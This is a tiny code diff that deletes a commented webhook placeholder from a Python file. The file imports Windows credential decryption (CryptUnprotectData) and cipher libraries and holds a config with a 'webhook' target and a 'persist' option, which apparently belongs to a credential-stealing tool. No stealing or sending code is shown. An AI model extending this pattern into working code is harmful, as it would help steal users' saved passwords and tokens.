@@ -7,8 +7,6 @@ from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES
 from cryptography.fernet import Fernet
 
-# "WEBHOOKHERE"
-
 config = {
     'webhook': "WEBHOOKHERE",
     'persist': False,
